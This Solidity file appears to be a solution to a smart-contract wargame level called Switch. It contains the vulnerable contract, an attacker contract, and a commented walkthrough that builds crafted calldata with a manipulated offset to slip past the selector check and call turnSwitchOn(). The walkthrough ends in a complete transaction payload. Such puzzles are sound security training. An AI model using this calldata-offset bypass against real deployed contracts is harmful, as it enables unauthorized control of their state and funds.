// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// Just have to flip the switch. Can't be that hard, right?
contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}

contract AttackSwitch {
    Switch switchVictim;
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
    bytes4 public onSelector = bytes4(keccak256("turnSwitchOn()"));

    constructor(address _switch){
        switchVictim = Switch(_switch);
    }

    function attack() external{
        bytes memory a = abi.encodeWithSelector(onSelector);
        switchVictim.flipSwitch(a);
    }
}

/*
We only can call flipSwitch but we need prepare bytes param
web3.utils.sha3("flipSwitch(bytes)").slice(0,10)
'0x30c13ade'
web3.utils.sha3("turnSwitchOff()").slice(0,10)
'0x20606e15'
web3.utils.sha3("turnSwitchOn()").slice(0,10)
'0x76227e12'

So we build calldata
0x30c13ade    -> function selector
0000000000000000000000000000000000000000000000000000000000000060 -> offset 96 bytes, location 0-32
0000000000000000000000000000000000000000000000000000000000000000 -> dummy, location 32-64
20606e1500000000000000000000000000000000000000000000000000000000 -> bypass check onlyOff, location 64-96
0000000000000000000000000000000000000000000000000000000000000004 -> start bytes data with length, length = 4 bytes
76227e1200000000000000000000000000000000000000000000000000000000 -> data is "turnSwitchOn()"


await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
*/